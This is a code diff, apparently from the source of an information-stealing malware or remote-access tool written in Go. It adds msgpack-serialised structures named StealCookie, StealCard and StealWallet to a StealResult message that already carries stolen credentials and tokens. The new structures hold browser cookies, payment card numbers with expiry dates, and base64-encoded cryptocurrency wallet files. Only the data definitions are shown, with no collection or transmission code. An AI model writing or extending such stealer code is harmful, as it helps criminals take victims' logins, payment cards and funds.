@@ -262,10 +262,38 @@ type StealCredential struct {
 	Password string `msgpack:"password"`
 }
 
+type StealCookie struct {
+	Browser  string `msgpack:"browser"`
+	Profile  string `msgpack:"profile"`
+	Host     string `msgpack:"host"`
+	Name     string `msgpack:"name"`
+	Value    string `msgpack:"value"`
+	Path     string `msgpack:"path"`
+	IsSecure bool   `msgpack:"isSecure"`
+}
+
+type StealCard struct {
+	Browser     string `msgpack:"browser"`
+	Profile     string `msgpack:"profile"`
+	Name        string `msgpack:"name"`
+	Number      string `msgpack:"number"`
+	ExpiryMonth int    `msgpack:"expiryMonth"`
+	ExpiryYear  int    `msgpack:"expiryYear"`
+}
+
+type StealWallet struct {
+	Wallet   string `msgpack:"wallet"`
+	Filename string `msgpack:"filename"`
+	DataB64  string `msgpack:"dataB64"`
+}
+
 type StealResult struct {
 	Type        string            `msgpack:"type"`
 	CommandID   string            `msgpack:"commandId"`
 	Credentials []StealCredential `msgpack:"credentials"`
+	Cookies     []StealCookie     `msgpack:"cookies"`
+	Cards       []StealCard       `msgpack:"cards"`
 	Tokens      []string          `msgpack:"tokens"`
+	Wallets     []StealWallet     `msgpack:"wallets"`
 	Errors      []string          `msgpack:"errors"`
 }
